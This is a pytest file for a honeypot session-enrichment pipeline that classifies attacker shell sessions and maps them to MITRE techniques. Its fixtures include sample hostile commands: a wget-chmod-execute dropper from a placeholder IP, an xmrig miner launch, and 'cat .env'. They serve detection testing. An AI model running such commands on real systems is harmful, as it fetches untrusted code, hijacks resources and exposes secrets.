"""Tests for the enrichment pipeline (bridge/enrich.py), degraded and full."""

from __future__ import annotations

import base64
from dataclasses import asdict

import pytest

from bridge.config import BridgeConfig
from bridge.enrich import MITRE_BY_TOOL, Enricher
from bridge.schema_adapter import core_session_to_ml


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def _session_from_commands(session_id: str, lines: list[str], base_ms: int = 1_700_000_000_000, gap_ms: int = 1000):
    """Build an ML Session via the adapter from a list of raw command lines."""
    commands = []
    for i, line in enumerate(lines):
        ts = base_ms + (i + 1) * gap_ms
        commands.append(
            {
                "event_id": f"{session_id}-e{i}", "sequence_number": i,
                "timestamp_ms": ts, "raw_input_b64": _b64(line),
                "parsed_command": line.split()[0] if line.split() else "",
                "parsed_args": line.split()[1:],
                "working_directory": "/home/ubuntu", "response_source": "hardcoded",
            }
        )
    doc = {
        "session_id": session_id,
        "network": {"client_ip": "203.0.113.7"},
        "timing": {"start_ms": base_ms, "duration_ms": gap_ms * len(lines)},
        "outcome": "clean_disconnect",
        "commands": commands,
        "bait_interactions": [],
    }
    return core_session_to_ml(doc)


# --- Degraded mode (no model checkpoint) -----------------------------------


def test_degraded_enrichment_dropper():
    enricher = Enricher(BridgeConfig())  # no checkpoint -> degraded
    assert enricher.has_model is False
    session = _session_from_commands(
        "s1", ["wget http://1.2.3.4/x.sh", "chmod +x x.sh", "./x.sh"]
    )
    r = enricher.enrich(session)
    assert r.tool_signature == "dropper"
    assert r.attacker_class == "dropper"
    assert r.classifier_confidence is not None and 0.0 < r.classifier_confidence <= 1.0
    assert "T1105" in r.mitre_techniques
    assert r.mitre_techniques == MITRE_BY_TOOL["dropper"]
    assert r.session_summary  # non-empty
    assert r.embedding is None
    assert r.trajectory is None


def test_degraded_enrichment_recon_uses_timing_when_tool_other():
    enricher = Enricher(BridgeConfig())
    # No tool-signature match -> falls back to timing label.
    session = _session_from_commands("s2", ["echo hi", "vim a.txt", "less b.txt"], gap_ms=1500)
    r = enricher.enrich(session)
    assert r.tool_signature == "other"
    assert r.attacker_class in ("automated", "human", "unknown")


def test_empty_session_is_unknown():
    enricher = Enricher(BridgeConfig())
    session = _session_from_commands("s3", [])
    r = enricher.enrich(session)
    assert r.attacker_class == "unknown"
    assert r.embedding is None


# --- Full mode (with a trained-shaped checkpoint) --------------------------


@pytest.fixture
def trained_artifacts(tmp_path):
    """Build a (randomly-initialized) embedder + fitted tokenizer on disk.

    We don't need real training to exercise the enrichment path -- only a
    checkpoint in the expected format and a fitted tokenizer.
    """
    import torch

    from mirage.models.embedding import SessionEmbedder, SessionEmbedderConfig
    from mirage.tokenizer.tokenizer import CommandTokenizer, TokenizerConfig

    sessions = [
        _session_from_commands("t1", ["wget http://1.2.3.4/a", "chmod +x a", "./a"]),
        _session_from_commands("t2", ["uname -a", "whoami", "cat /proc/cpuinfo"]),
        _session_from_commands("t3", ["./xmrig -o stratum+tcp://pool"]),
        _session_from_commands("t4", ["ls", "cd /tmp", "ls -la", "cat .env"]),
    ]
    tok = CommandTokenizer(TokenizerConfig(mode="command", top_k=100)).fit(sessions)
    tok_dir = tmp_path / "tokenizer"
    tok.save(tok_dir)

    cfg = SessionEmbedderConfig(vocab_size=tok.vocab_size, d_model=128, n_layers=2, n_heads=4)
    model = SessionEmbedder(cfg)
    ckpt = tmp_path / "best.pt"
    torch.save({"state_dict": model.state_dict(), "config": asdict(cfg)}, ckpt)
    return str(ckpt), str(tok_dir), sessions


def test_full_enrichment_produces_embedding_and_trajectory(trained_artifacts):
    ckpt, tok_dir, sessions = trained_artifacts
    config = BridgeConfig(
        model_checkpoint=ckpt, tokenizer_dir=tok_dir, model_version="test-v1"
    )
    enricher = Enricher(config)
    assert enricher.has_model is True

    r = enricher.enrich(sessions[0])  # the dropper
    assert r.embedding is not None
    assert r.embedding_dim == 128
    assert len(r.embedding) == 128
    assert r.model_version == "test-v1"
    assert r.trajectory is not None
    for key in (
        "path_length", "mean_speed", "total_curvature", "straightness",
        "convergence_step", "intent_shift_count", "shape_signature",
    ):
        assert key in r.trajectory
    # No centroids configured -> no cluster assignment.
    assert r.cluster_id is None
    # Summary now mentions the trajectory.
    assert "trajectory" in r.session_summary
